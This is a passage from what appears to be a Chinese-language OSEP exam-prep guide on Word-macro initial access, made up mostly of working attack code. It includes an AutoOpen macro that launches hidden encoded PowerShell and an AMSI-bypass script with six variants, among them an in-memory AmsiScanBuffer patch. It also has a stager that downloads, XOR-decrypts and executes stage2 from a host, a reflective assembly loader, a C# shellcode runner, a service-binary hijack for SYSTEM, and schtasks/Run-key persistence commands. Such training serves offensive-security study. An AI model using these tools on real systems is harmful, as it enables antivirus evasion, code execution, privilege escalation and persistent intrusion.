1. **VBA 内 API 调用被拦**（Defender ASR 规则"阻止 Office 创建子进程/注入"） → 改用 COM 对象执行（如 `MMC20.Application`、`Shell.Application`）、或纯 VBA 加载托管程序集。
2. **宏能跑但无法执行任何代码**（语言/权限限制） → 换入口：HTA（M02）、JScript（M03）。
3. **进程内执行导致 Word 崩溃** → 位数不匹配（回到场景 1 探测）或 shellcode 未解密干净。

**考试注意 / OPSEC**：这条路线最大的价值是"不产生可疑进程链"。投递前先在本机 Office 版本上验证 PtrSafe 声明与位数分支。

---

## 场景 3：Word 可以启动 PowerShell，但第二阶段脚本被扫描拦截

**场景回顾**：上传文档后能确认 PowerShell 已启动，但下载或解释第二阶段时出现"脚本内容被阻止"——典型 AMSI 拦截。

**前提与假设**：
- 宏 → PowerShell 的链路已验证可用（场景 1/2 的对照结果）。
- 拦截发生在**脚本内容**层，不是网络层（投递日志能看到 stage2 被请求）。

**准备（攻击机侧）**：
1. 短宏第一阶段（尽量短，减少宏自身特征）：
   ```vb
   Sub AutoOpen()
       Shell "powershell -nop -w hidden -ep bypass -enc <BASE64>", vbHide
   End Sub
   ```
2. 与 **PowerShell 宿主匹配**的 AMSI 处理脚本：`m05-amsi-bypass-variants.ps1`
3. 一个**无害 stage2**（只回连/写文件）用于分段验证。

**执行步骤**：

1. 先用无害 stage2 跑通整条链路（宏 → PS → 下载 → 执行）。
2. 换上真实 stage2，观察是否出现 `This script contains malicious content and has been blocked by your antivirus software`。
3. 被拦时：在 stage2 最前面加载 AMSI 处理（版本 1→2→3→4 依次试），每次只换一个版本。
4. 仍被拦 → 把 stage2 拆成"AMSI 处理脚本 + 真正的载荷脚本"两个文件，先处理再取载荷。
5. 仍被拦 → 转非 PowerShell 路线（托管程序集反射加载，场景 4）或换宿主（JScript/HTA）。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m05-amsi-bypass-variants.ps1` | AMSI 处理多版本 + 探针 | `-Variant 1..6` |
| `m01-stager-download-encrypted.ps1` | 加密/混淆的下载执行 stage2 | LHOST/URL |
| `m01-reflective-runner.ps1` | 反射加载，绕过对落地脚本的扫描 | 程序集路径 |

#### `m05-amsi-bypass-variants.ps1` {#m05-amsi-bypass-variants-ps1}

````powershell
<#
用途：AMSI 处理的多个实验版本，按宿主（PowerShell / WSH / .NET）选择匹配的实现
场景：3、7、10、18、19（以及 M05 全部场景中 PowerShell 路线的前置）
依赖：PowerShell 3.0+；部分版本需要反射权限（CLM 下会失败，见 m05-clm-bypass-runspace.ps1）
使用：powershell -ep bypass -f m05-amsi-bypass-variants.ps1 -Variant 1
      或在已有会话中：. .\m05-amsi-bypass-variants.ps1; Invoke-AmsiVariant -Variant 2
占位符：无（纯本地操作，不涉及 LHOST/LPORT）
测试状态：未在 Windows 实测；已人工检查语法。考试前必须在实验环境逐个验证有效性
说明：
  - AMSI 的处理方式随补丁变化，一个版本失效不代表技术不可用，换下一个版本即可。
  - 先做"探针"判断 AMSI 是否生效，再决定是否需要处理。
  - PowerShell 宿主用 PS 版本；WSH（.js/.vbs）必须用 WSH 专用版本，不能照搬。
#>
[CmdletBinding()]
param(
    [ValidateSet(1, 2, 3, 4, 5, 6)][int]$Variant = 1,
    [switch]$ProbeOnly
)

function Test-AmsiActive {
    <#
    无害探针：包含 AMSI 常扫特征字符串。若被拦，说明 AMSI 生效。
    #>
    $probe = 'Invoke-Mimikatz'
    $marker = 'AmsiUtils' + 'amsiInitFailed'
    Write-Output ("[*] 探针字符串: {0} / {1}" -f $probe, $marker)
    try {
        $sb = [scriptblock]::Create($probe)
        Write-Output "[+] 探针未被拦截（AMSI 可能未生效或已被处理）"
        return $false
    } catch {
        Write-Output ("[!] 探针被拦截：{0}" -f $_.Exception.Message)
        return $true
    }
}

function Invoke-AmsiVariant {
    param([int]$Variant)

    Write-Output ("[*] 应用 AMSI 处理版本 {0}" -f $Variant)

    switch ($Variant) {
        1 {
            # 版本 1：反射设置 amsiInitFailed（最经典，常被拦，但先试）
            try {
                $a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like '*iUtils' }
                $f = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like '*Failed' }
                $f.SetValue($null, $true)
                Write-Output "[+] 版本 1 完成"
            } catch { Write-Output ("[-] 版本 1 失败: {0}" -f $_.Exception.Message) }
        }
        2 {
            # 版本 2：通过字符串拼接避开静态特征
            try {
                $s = 'S'+'y'+'s'+'t'+'e'+'m'+'.'+'M'+'a'+'n'+'a'+'g'+'e'+'m'+'e'+'n'+'t'+'.'+'A'+'u'+'t'+'o'+'m'+'a'+'t'+'i'+'o'+'n'
                $t = [type]($s + '.AmsiUtils')
                $f = $t.GetField('amsiInitFailed', 'NonPublic,Static')
                $f.SetValue($null, $true)
                Write-Output "[+] 版本 2 完成"
            } catch { Write-Output ("[-] 版本 2 失败: {0}" -f $_.Exception.Message) }
        }
        3 {
            # 版本 3：破坏 amsiContext（反射置空上下文）
            try {
                $t = [Ref].Assembly.GetType(('System.Management.Automation.'+'AmsiUtils'))
                $ctx = $t.GetField('amsiContext', 'NonPublic,Static')
                $ctx.SetValue($null, [IntPtr]::Zero)
                Write-Output "[+] 版本 3 完成"
            } catch { Write-Output ("[-] 版本 3 失败: {0}" -f $_.Exception.Message) }
        }
        4 {
            # 版本 4：内存补丁（把 AmsiScanBuffer 首字节改为 ret）
            try {
                $k = @"
using System;
using System.Runtime.InteropServices;
public class P {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);
    public static void Patch() {
        IntPtr lib = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
        uint old;
        VirtualProtect(addr, (UIntPtr)5, 0x40, out old);
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax,0x80070057; ret
        Marshal.Copy(patch, 0, addr, patch.Length);
    }
}
"@
                Add-Type -TypeDefinition $k -ErrorAction Stop
                [P]::Patch()
                Write-Output "[+] 版本 4 完成（需允许 Add-Type）"
            } catch { Write-Output ("[-] 版本 4 失败（Add-Type 可能被拦）: {0}" -f $_.Exception.Message) }
        }
        5 {
            # 版本 5：自定义 Runspace 内置版本（CLM 环境下配合使用）
            try {
                $rs = [runspacefactory]::CreateRunspace()
                $rs.Open()
                $ps = [powershell]::Create()
                $ps.Runspace = $rs
                [void]$ps.AddScript({ $ExecutionContext.SessionState.LanguageMode = 'FullLanguage' })
                [void]$ps.Invoke()
                Write-Output "[+] 版本 5 完成（新 Runspace 语言模式已放开）"
            } catch { Write-Output ("[-] 版本 5 失败: {0}" -f $_.Exception.Message) }
        }
        6 {
            # 版本 6：不做处理，只报告（用于对照实验）
            Write-Output "[*] 版本 6：未做任何处理，作为对照组"
        }
    }
}

if ($ProbeOnly) {
    [void](Test-AmsiActive)
} else {
    [void](Test-AmsiActive)
    Invoke-AmsiVariant -Variant $Variant
    Write-Output ""
    Write-Output "[*] 复测："
    [void](Test-AmsiActive)
    Write-Output "[*] 提示：版本 1/2/3 属于反射类，补丁后常失效；版本 4 需要 Add-Type；"
    Write-Output "    版本 5 与 CLM 绕过配合；全部失效时考虑改用托管程序集或非 PowerShell 路线。"
}
````

#### `m01-stager-download-encrypted.ps1` {#m01-stager-download-encrypted-ps1}

````powershell
<#
用途：加密/混淆的下载执行 stager（HTTP(S) 取第二阶段并在内存中执行，不落地明文）
场景：3、17、28、30、31（第二阶段被扫 / 需要代理感知 / 分阶段）
依赖：PowerShell 3.0+
使用：powershell -ep bypass -f m01-stager-download-encrypted.ps1 -Url http://LHOST/stage2.b64 -XorKey 42
      带代理：powershell -ep bypass -f m01-stager-download-encrypted.ps1 -Url https://LHOST/s2 -Proxy http://proxy:8080 -ProxyCredential
占位符：LHOST/URL（第二阶段地址）、XorKey（与攻击机编码时一致）
测试状态：未在 Windows 实测；已人工检查语法
说明：
  - 攻击机侧先编码：python3 m13-xor-encoder.py stage2.ps1 --format b64 --key 42
  - 本脚本只做"取回 + 解密 + IEX"，AMSI 处理放在调用方（见 m05-amsi-bypass-variants.ps1）
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][string]$Url,
    [int]$XorKey = 42,
    [string]$Proxy = '',
    [switch]$ProxyCredential,
    [switch]$UseDefaultCredentials,
    [string]$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36',
    [switch]$NoExecute
)

function Get-Stage {
    param([string]$Uri)

    $wc = New-Object Net.WebClient
    $wc.Headers.Add('User-Agent', $UserAgent)

    if ($Proxy -ne '') {
        $wc.Proxy = New-Object Net.WebProxy($Proxy, $true)
        if ($UseDefaultCredentials) { $wc.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials }
        elseif ($ProxyCredential)     { $wc.Proxy.Credentials = Get-Credential }
    }

    # 自签证书场景：忽略证书校验（仅考试环境）
    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { }

    Write-Output ("[*] 下载: {0}" -f $Uri)
    return $wc.DownloadString($Uri)
}

function Invoke-Decode {
    param([string]$Data, [int]$Key)

    $raw = $null
    # 优先按 Base64 解；失败则当作纯 XOR 十六进制
    try {
        $bytes = [Convert]::FromBase64String(($Data -replace '\s', ''))
    } catch {
        Write-Output "[!] 非 Base64，按原始字节处理"
        $bytes = [Text.Encoding]::UTF8.GetBytes($Data)
    }
    $out = New-Object byte[] $bytes.Length
    for ($i = 0; $i -lt $bytes.Length; $i++) { $out[$i] = $bytes[$i] -bxor $Key }
    return [Text.Encoding]::UTF8.GetString($out)
}

try {
    $enc = Get-Stage -Uri $Url
    Write-Output ("[*] 收到 {0} 字符" -f $enc.Length)
    $script = Invoke-Decode -Data $enc -Key $XorKey
    Write-Output ("[*] 解密后 {0} 字符" -f $script.Length)

    if ($NoExecute) {
        Write-Output "[*] -NoExecute：仅打印前 200 字符"
        Write-Output $script.Substring(0, [Math]::Min(200, $script.Length))
        return
    }

    Write-Output "[*] 内存执行（不落地）"
    Invoke-Expression $script
} catch {
    Write-Output ("[-] 失败: {0}" -f $_.Exception.Message)
    Write-Output "[*] 排查：① 代理是否生效（-Proxy）② 证书是否被检查 ③ 内容是否被 AMSI 拦"
    exit 1
}
````

#### `m01-reflective-runner.ps1` {#m01-reflective-runner-ps1}

````powershell
<#
用途：反射加载 .NET 程序集（内存执行，不落地临时文件），替代被拦的 Add-Type 动态编译
场景：4、3（Add-Type 产生的临时文件被删 / 需要内存加载已编译程序集）
依赖：PowerShell 3.0+；目标已有或已投递的程序集（.dll 或 Base64 字节）
使用：
    powershell -ep bypass -f m01-reflective-runner.ps1 -Path payload.dll
    powershell -ep bypass -f m01-reflective-runner.ps1 -Base64 <base64> -Type Payload.Runner -Method Run
占位符：LHOST/URL（若用 -Url 下载）；程序集路径/Base64 与入口类型由使用者替换
测试状态：未在 Windows 实测；已人工检查语法
#>
[CmdletBinding(DefaultParameterSetName = 'Path')]
param(
    [Parameter(ParameterSetName = 'Path', Mandatory = $true)][string]$Path,
    [Parameter(ParameterSetName = 'Base64', Mandatory = $true)][string]$Base64,
    [Parameter(ParameterSetName = 'Url', Mandatory = $true)][string]$Url,
    [string]$Type = '',
    [string]$Method = '',
    [string[]]$Arguments = @(),
    [switch]$ListTypes
)

function Get-AssemblyBytes {
    switch ($PSCmdlet.ParameterSetName) {
        'Path'   { return [IO.File]::ReadAllBytes((Resolve-Path -LiteralPath $Path)) }
        'Base64' { return [Convert]::FromBase64String($Base64) }
        'Url'    {
            Write-Output ("[*] 从 {0} 下载程序集字节..." -f $Url)
            return (New-Object Net.WebClient).DownloadData($Url)
        }
    }
}

try {
    $bytes = Get-AssemblyBytes
    Write-Output ("[*] 程序集字节数: {0}" -f $bytes.Length)

    # 内存加载（不写磁盘）
    $asm = [Reflection.Assembly]::Load($bytes)
    Write-Output ("[+] 已加载: {0}" -f $asm.FullName)

    if ($ListTypes -or -not $Type) {
        Write-Output "[*] 公开类型："
        $asm.GetTypes() | Where-Object { $_.IsPublic } | ForEach-Object { Write-Output ("    " + $_.FullName) }
        if (-not $Type) { return }
    }

    $t = $asm.GetType($Type)
    if (-not $t) { throw ("未找到类型: {0}" -f $Type) }

    if (-not $Method) {
        # 自动挑入口：Run → Main → 第一个无参公开静态方法
        $candidates = $t.GetMethods([Reflection.BindingFlags]'Public,Static') |
            Where-Object { $_.GetParameters().Count -eq $Arguments.Count }
        $m = $candidates | Where-Object Name -eq 'Run' | Select-Object -First 1
        if (-not $m) { $m = $candidates | Where-Object Name -eq 'Main' | Select-Object -First 1 }
        if (-not $m) { $m = $candidates | Select-Object -First 1 }
    } else {
        $m = $t.GetMethod($Method)
    }
    if (-not $m) { throw "未找到可调用的入口方法" }

    Write-Output ("[+] 调用 {0}.{1}()" -f $t.FullName, $m.Name)
    $result = $m.Invoke($null, [object[]]$Arguments)
    if ($null -ne $result) { Write-Output ("[+] 返回: {0}" -f $result) }
} catch {
    Write-Output ("[-] 失败: {0}" -f $_.Exception.Message)
    Write-Output "[*] 排查顺序：① 是否被 AMSI 拦（先做 m05-amsi-bypass-variants.ps1）"
    Write-Output "             ② 程序集是否被静态查杀（换自定义 Runner / XOR 编码）"
    Write-Output "             ③ 入口签名是否匹配（用 -ListTypes 看类型）"
    exit 1
}
````

**验证**：先看投递日志确认 stage2 被请求；再看会话是否建立；最后复测探针确认 AMSI 状态。

**失败分支与备选**：
1. **AMSI 处理脚本本身被拦** → 用字符串拼接/编码版本，或改用反射加载的 .NET 程序集（不经过 AMSI 的脚本路径）。
2. **所有版本失效**（目标补丁较新） → 放弃 PowerShell 路线，走场景 4 的预编译 C# 或 M02/M03 的其它宿主。
3. **stage2 下载被拦但脚本没被拦** → 是网络/代理问题，转 [09-c2-egress-channels](/zh/modules/09-c2-egress-channels)。

**考试注意 / OPSEC**：AMSI 处理是"版本对抗"，考试环境里通常有可用版本；但不要把时间全押在它上面——**换宿主形态往往更快**。

---

## 场景 4：Word 入口可用，但 PowerShell 动态编译产生的文件被删除

**场景回顾**：宏和 PowerShell 都能启动，语言模式也没受限；但依赖 `Add-Type` 的 Runner 失败，动态编译产生的临时文件被检测删除。

**前提与假设**：
- PowerShell 可用且非 CLM。
- 拦截点在 `Add-Type` 生成的临时程序集文件（`%TEMP%` 下随机名）。

**准备（攻击机侧）**：
1. **反射 Runner**（内存加载已编译程序集，不触发动态编译）：
   ```powershell
   $b = [Convert]::FromBase64String($enc); $asm = [Reflection.Assembly]::Load($b)
   $asm.EntryPoint.Invoke($null, @(,[string[]]@()))
   ```
2. **预编译 C# Runner**（在攻击机或目标机 `csc.exe` 编译一次，之后只投递 DLL/字节）：
   ```bash
   # 攻击机（如有 mono/dotnet）
   mcs -target:library -out:runner.dll m01-shellcode-runner-x64.cs
   ```

**执行步骤**：

1. 确认失败点是 `Add-Type`：把 Runner 里的 `Add-Type` 换成 `[Reflection.Assembly]::Load($bytes)` 后重试。
2. 用 Base64 内嵌程序集（避免投递 DLL 文件被静态查杀）。
3. 反射调用入口，传入必要参数。
4. 若程序集入口是 `Main`，注意签名：`Invoke($null, @(,[string[]]@()))`（注意 `string[]` 数组的包装）。
5. 成功后立即做会话稳定化（场景 5）。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m01-reflective-runner.ps1` | 反射加载 .NET 程序集 | `-Path` / `-Base64` |
| `m01-shellcode-runner-x64.cs` | 预编译 Runner 源码 | shellcode 密文 + key |
| `m01-stager-download-encrypted.ps1` | 加密 stager | LHOST/URL |

#### `m01-shellcode-runner-x64.cs` {#m01-shellcode-runner-x64-cs}

````csharp
// 用途：自定义 x64 shellcode Runner（预编译使用，避免 Add-Type 动态编译落地临时文件）
// 场景：4、18、19（Add-Type 被拦 / 自定义 EXE 被静态查杀 / 行为检测对照）
// 依赖：.NET Framework 4.x（目标机 csc.exe 编译，或攻击机 mono/dotnet 交叉编译）
// 使用：
//   目标机：C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:r.exe m01-shellcode-runner-x64.cs
//   攻击机：mcs -out:r.exe m01-shellcode-runner-x64.cs
// 占位符：SHELLCODE_B64（XOR 编码后的 x64 shellcode 的 Base64）、XOR_KEY
// 测试状态：未编译验证（本机无 csc/mono）；语法已人工检查
//
// 说明：
//   - shellcode 以 Base64 字符串内嵌（避免明文字节数组的静态特征），运行时 XOR 解密。
//   - 用 P/Invoke 而不是 Add-Type 生成临时程序集，所以不会在 %TEMP% 留下编译产物。
//   - 若目标对 VirtualAlloc+CreateThread 有行为拦截，改用 Assembly.Load 走托管路径（见 m01-reflective-runner.ps1）。

using System;
using System.Runtime.InteropServices;
using System.Text;

class Runner
{
    private const string SHELLCODE_B64 = "REPLACE_WITH_BASE64_XOR_SHELLCODE";
    private const byte XOR_KEY = 0x2A;

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    private static byte[] Decode()
    {
        byte[] data = Convert.FromBase64String(SHELLCODE_B64);
        for (int i = 0; i < data.Length; i++) data[i] ^= XOR_KEY;
        return data;
    }

    public static void Run()
    {
        byte[] sc = Decode();

        const uint MEM_COMMIT_RESERVE = 0x3000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);
        if (mem == IntPtr.Zero)
        {
            Console.Error.WriteLine("VirtualAlloc 失败（可能被 ASR/EDR 拦截），错误码 " + Marshal.GetLastWin32Error());
            return;
        }

        Marshal.Copy(sc, 0, mem, sc.Length);

        uint tid;
        IntPtr h = CreateThread(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, out tid);
        if (h == IntPtr.Zero)
        {
            Console.Error.WriteLine("CreateThread 失败，错误码 " + Marshal.GetLastWin32Error());
            return;
        }

        WaitForSingleObject(h, 2000);
    }

    public static void Main(string[] args)
    {
        Run();
    }
}
````

**验证**：`%TEMP%` 下不再出现新编译的程序集；`[AppDomain]::CurrentDomain.GetAssemblies()` 能看到已加载程序集；监听端有会话。

**失败分支与备选**：
1. **程序集加载被 AMSI 拦** → 先做 AMSI 处理（场景 3），再加载。
2. **程序集本身被静态查杀** → 换自定义 Runner（改字符串/去掉公共模板特征），或改用 XOR 编码的 shellcode + 纯 P/Invoke 实现。
3. **完全禁止加载未签名程序集** → 走受信任宿主（M05 场景 23/24）。

**考试注意 / OPSEC**：`Add-Type` 的失败往往伴随 `%TEMP%` 下的临时 DLL 被删，这条日志在报告里是很好的证据；但考试目标是拿到会话，不要在这里恋战。

---

## 场景 5：Word payload 成功上线，但文档关闭后会话消失

**场景回顾**：上传文档后得到会话，但后台用户很快关闭 Word，会话随之终止；目标进程中有同用户的长期运行程序。→ 需要**脱离初始文档生命周期**。

**前提与假设**：
- 已有一个可用会话，但宿主进程是 `WINWORD.EXE`。
- 当前用户有权限创建计划任务/写注册表（普通用户可写 HKCU）。

**准备（攻击机侧）**：按"用户 / 位数 / 权限"准备三套迁移方案

| 条件 | 迁移目标 | 方式 |
|---|---|---|
| 普通用户 + x64 | `explorer.exe`、`RuntimeBroker.exe`、已安装的常驻程序 | 进程注入 / 迁移 |
| 普通用户 + 需持久 | 计划任务（用户级）、HKCU Run 键 | 重新拉起独立进程 |
| 有管理员 | 服务、机器级计划任务 | 服务型 payload |

**执行步骤**：

1. 拿到会话后**第一件事**不是提权，而是稳定化：
   ```text
   Meterpreter: migrate -N explorer.exe     # 或 getpid 后选同用户常驻进程
   Cobalt/自研:  进程注入到 explorer.exe
   ```
2. 若无迁移工具，用"独立进程"路线：宏/PowerShell 里用 `CreateProcess` 以分离方式拉起载荷，使父进程退出后子进程继续运行。
3. 再补一条持久化（考试中通常不强制，但防止中途丢会话）：
   ```cmd
   schtasks /create /tn "Updater" /tr "C:\path\payload.exe" /sc minute /mo 5 /f
   reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d "C:\path\payload.exe" /f
   ```
4. 关闭 Word，确认会话仍在。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m01-embedded-dotnet-runner.vba` | 内嵌执行，减少依赖 | 程序集 Base64 |
| `m01-reflective-runner.ps1` | 迁移后重新加载载荷 | 程序集/字节 |
| `m06-service-hijack.ps1` | 有管理员时的服务级持久化 | 服务名 |

#### `m06-service-hijack.ps1` {#m06-service-hijack-ps1}

````powershell
<#
用途：手工服务二进制劫持的完整自动化——先保存原配置（注册表导出 + 原 exe 备份），替换为 payload 并启动服务，之后再一键回滚恢复原状
场景：docs/06-uac-windows-privesc.md 场景 27（自动服务提权工具失败，但你确认能改某高权限服务的二进制或 ImagePath）
依赖：PowerShell 3.0+（Get-CimInstance）；当前用户对该服务有 start/stop/改配置权限；payload 已上传到目标（如 C:\Windows\Temp\svcpayload.exe）
使用：先劫持：
      powershell -ep bypass -f m06-service-hijack.ps1 -ServiceName <svc> -PayloadPath C:\Windows\Temp\svcpayload.exe
      # 验证拿到 SYSTEM（whoami）后回滚：
      powershell -ep bypass -f m06-service-hijack.ps1 -Action Restore -ServiceName <svc>
      # 目标目录不可写但 ImagePath 可改时，劫持加 -UseImagePath（ImagePath 指向 payload）
占位符：TARGET=目标主机；payload 里 LHOST/LPORT 已编好；USER/PASS 模式见 m06-service-binary-payload.c
测试状态：未在 Windows 实测（本机为 macOS）；语法经人工检查。回滚逻辑务必先在隔离 VM 验证一次
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][ValidateSet("Hijack", "Restore")][string]$Action = "Hijack",
    [Parameter(Mandatory = $true)][string]$ServiceName,
    [string]$PayloadPath = "C:\Windows\Temp\svcpayload.exe",
    [switch]$UseImagePath,            # 目录不可写时改注册表 ImagePath 指向 payload
    [int]$WaitSeconds = 8
)

$ErrorActionPreference = "Stop"
$StateFile = Join-Path $env:TEMP ("m06-" + $ServiceName + "-state.txt")

function Write-Log($m) { Write-Output ("[{0}] {1}" -f (Get-Date -Format "HH:mm:ss"), $m) }
function Get-Svc {
    Get-CimInstance Win32_Service -Filter "Name='$ServiceName'" -ErrorAction Stop
}
function Split-BinPath([string]$p) {
    # PathName 可能是 "C:\Program Files\X\svc.exe" --arg；解析出纯 exe 路径
    $p = $p.Trim()
    if ($p.StartsWith('"')) { return ($p -split '"')[1] }
    return ($p -split '\s+')[0]
}

if (-not (Get-Svc)) { Write-Log "[-] 服务 $ServiceName 不存在（服务名区分大小写，sc qc 核对）"; exit 1 }

# ================= 回滚 =================
if ($Action -eq "Restore") {
    if (-not (Test-Path $StateFile)) { Write-Log "[-] 找不到状态文件 $StateFile —— 无备份可恢复，人工用当时导出的 .reg/备份 exe 恢复"; exit 1 }
    $s = Get-Content $StateFile | Out-String | ConvertFrom-StringData
    Write-Log "[+] 停止服务并恢复原二进制 $($s.OriginalPath)"
    try { Stop-Service -Name $ServiceName -Force -ErrorAction Stop } catch { Write-Log "[!] 停止失败：$($_.Exception.Message)（继续尝试复制）" }
    Start-Sleep -Seconds 1
    try {
        if ($s.BackupPath -and (Test-Path $s.BackupPath)) {
            Copy-Item -Path $s.BackupPath -Destination $s.OriginalPath -Force
            Write-Log "[+] 原 exe 已复制回 $($s.OriginalPath)"
        }
        if ($s.RegBackup -and (Test-Path $s.RegBackup)) {
            reg import $s.RegBackup | Out-Null
            Write-Log "[+] 注册表已从 $($s.RegBackup) 恢复"
        }
        Remove-Item $StateFile -Force
    } catch { Write-Log "[-] 回滚失败：$($_.Exception.Message)"; exit 1 }
    try { Start-Service -Name $ServiceName -ErrorAction Stop; Write-Log "[+] 服务已按原配置重新启动（验证：sc query $ServiceName 应为 RUNNING）" }
    catch { Write-Log "[!] 服务未能启动：$($_.Exception.Message)（检查 .reg 是否含 Startup 密码等）" }
    exit 0
}

# ================= 劫持 =================
$svc  = Get-Svc
$bin  = Split-BinPath $svc.PathName
Write-Log "[+] 服务: $($svc.Name) | 原二进制: $bin | 运行账户: $($svc.StartName)"
if (-not (Test-Path $bin)) { Write-Log "[-] 原二进制不存在 $bin（路径含变量？先人工确认）"; exit 1 }
if (-not (Test-Path $PayloadPath)) { Write-Log "[-] payload 不存在 $PayloadPath，先上传"; exit 1 }

$stamp = Get-Date -Format "yyyyMMdd-HHmmss"
$regBackup = Join-Path $env:TEMP ("m06-" + $ServiceName + "-" + $stamp + ".reg")
$backupExe = Join-Path $env:TEMP ("m06-" + $ServiceName + "-" + $stamp + ".exe")

Write-Log "[+] 保存原配置：reg export + 原 exe 备份"
reg export ("HKLM\SYSTEM\CurrentControlSet\Services\" + $ServiceName) $regBackup /y | Out-Null
Copy-Item -Path $bin -Destination $backupExe -Force
@("OriginalPath=$bin", "BackupPath=$backupExe", "RegBackup=$regBackup") | Set-Content -Path $StateFile -Encoding Ascii
Write-Log "[+] 备份: exe→$backupExe ; reg→$regBackup"

Write-Log "[+] 停止服务"
try { Stop-Service -Name $ServiceName -Force -ErrorAction Stop } catch { Write-Log "[-] 无法停止服务：$($_.Exception.Message)（换可停服务，或依赖重启/定时触发）"; exit 1 }

try {
    if ($UseImagePath) {
        Write-Log "[+] 改 ImagePath → $PayloadPath（目录不可写备选）"
        reg add ("HKLM\SYSTEM\CurrentControlSet\Services\" + $ServiceName) /v ImagePath /t REG_EXPAND_SZ /d $PayloadPath /f | Out-Null
    } else {
        Write-Log "[+] 替换二进制：$bin ← $PayloadPath"
        Copy-Item -Path $PayloadPath -Destination $bin -Force
    }
    Write-Log "[+] 启动服务（触发 payload）"
    Start-Service -Name $ServiceName -ErrorAction SilentlyContinue
    Start-Sleep -Seconds $WaitSeconds
} catch {
    Write-Log "[!] 触发阶段异常：$($_.Exception.Message)（shell 可能已回连，属预期；sc start 报 1053 时 payload 副作用已发生）"
}

Write-Log "[*] 验证：攻击机监听应收到 SYSTEM shell（whoami → nt authority\system）"
Write-Log "[*] 拿到 shell 后务必回滚：-Action Restore -ServiceName $ServiceName"
Write-Log "[*] 若回滚时 exe 被占用（payload 进程还活着）：taskkill /F /IM <payload名> 后重跑 Restore"
````

**验证**：关闭 Word 后 `tasklist` 中载荷进程仍在；监听端会话未断开；重新连接仍可用。

**失败分支与备选**：
1. **迁移失败**（目标进程位数不同 / 权限不足） → 选**同用户同位数**的进程；或用"独立进程"路线而非注入。
2. **注入被拦** → 用计划任务重新拉起，或让载荷以 `cmd /c start` 方式脱离父进程。
3. **会话迁移后立刻断** → 新宿主被 EDR 监控；换另一个常驻进程（如 `sihost.exe`、已安装的第三方常驻程序）。

**考试注意 / OPSEC**：**拿到会话的第一动作是稳定化**，不是提权。很多 OSEP 考生在这里丢分——会话有了，两分钟后又没了。

---

## 模块速查表

| 目的 | 命令/要点 |
|---|---|
| 验证宏与出网 | 无害回调宏（`m01-callback-ping.vba`） |
| 判断 Office 位数 | WMI 查 `winword.exe` 命令行是否含 `Program Files (x86)` |
| 不创建子进程执行 | VBA + `VirtualAlloc`/`CreateThread`（`m01-shellcode-runner-vba-*.vba`） |
| AMSI 拦截 | 与 PS 宿主匹配的处理版本（`m05-amsi-bypass-variants.ps1`） |
| Add-Type 被删 | 反射加载预编译程序集（`m01-reflective-runner.ps1`） |
| 脱离文档生命周期 | 迁移到同用户常驻进程 / 计划任务 / HKCU Run |
| 位数不确定 | 投 `archbranch` 版本，或先探测再投 |

## 关联脚本清单

| 脚本 | 说明 |
|---|---|
| `m01-callback-ping.vba` | 无害回调宏 |
| `m01-detect-arch.vba` | 位数识别并回传 |
| `m01-shellcode-runner-vba-x86.vba` / `-x64.vba` | 进程内 Runner |
| `m01-shellcode-runner-vba-archbranch.vba` | 位数分支 Runner |
| `m01-embedded-dotnet-runner.vba` | 内嵌 .NET 加载（无出网也可用） |
| `m01-stager-download-encrypted.ps1` | 加密下载执行 |
| `m01-reflective-runner.ps1` | 反射加载 |
| `m01-shellcode-runner-x64.cs` | 预编译 Runner 源码 |
| `m05-amsi-bypass-variants.ps1` | AMSI 处理（跨模块共用） |
